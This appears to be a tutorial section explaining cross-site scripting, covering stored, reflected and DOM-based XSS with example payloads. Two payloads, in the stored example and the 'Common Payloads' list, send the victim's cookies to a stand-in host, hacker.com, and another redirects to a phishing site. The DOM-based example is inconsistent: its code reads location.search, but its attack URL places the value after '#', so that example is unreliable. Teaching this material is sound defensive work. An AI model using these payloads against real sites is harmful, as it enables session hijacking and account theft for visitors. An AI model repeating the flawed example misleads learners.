### **Cross-Site Scripting (XSS)**

**XSS** occurs when an application includes untrusted data in a web page without proper validation or escaping. Unlike other attacks that target the server, XSS targets the **user**. The attacker's goal is to execute malicious JavaScript in the victim's browser to steal session cookies, hijack accounts, or deface websites.

---

### **The Three Main Types**

**1. Stored (Persistent) XSS**

The malicious script is permanently stored on the target server (e.g., in a database, a comment field, or a user profile). Every user who views the affected page executes the script.

- **Example:** A user posts a comment: `<script>fetch('http://hacker.com/steal?cookie=' + document.cookie)</script>`.
    
- **Result:** Every visitor who reads that comment unknowingly sends their session cookie to the attacker.
    

**2. Reflected (Non-Persistent) XSS**

The script is "reflected" off the web server to the victim. It is usually delivered via a link where the script is embedded in a URL parameter.

- **Example URL:** `https://example.com/search?q=<script>alert('XSS')</script>`
    
- **The Attack:** The attacker tricks a victim into clicking this link. The server takes the `q` parameter and prints it directly onto the results page: _"You searched for `<script>alert('XSS')</script>`"_.
    
- **Result:** The script executes only for the person who clicked that specific link.
    

**3. DOM-based XSS**

The vulnerability exists entirely in the **client-side code** (JavaScript). The server is never involved. The script is executed when the page's JavaScript reads data from the URL (the DOM) and writes it back to the page unsafely.

- **Example:** A page has a script: `var name = new URLSearchParams(window.location.search).get("name"); document.getElementById("welcome").innerHTML = "Hello " + name;`
    
- **The Attack:** `https://example.com/welcome#name=<img src=x onerror=alert(1)>`
    
- **Result:** The browser's own JS engine processes the malicious string and executes it locally.

**Common Payloads:**

- **Cookie Stealing:** `<script>new Image().src="http://hacker.com/log.php?c="+document.cookie;</script>`
    
- **Redirection:** `<script>window.location="http://phishing-site.com";</script>`
    
- **Keylogging:** Injecting a script that records every keystroke the user types on the page.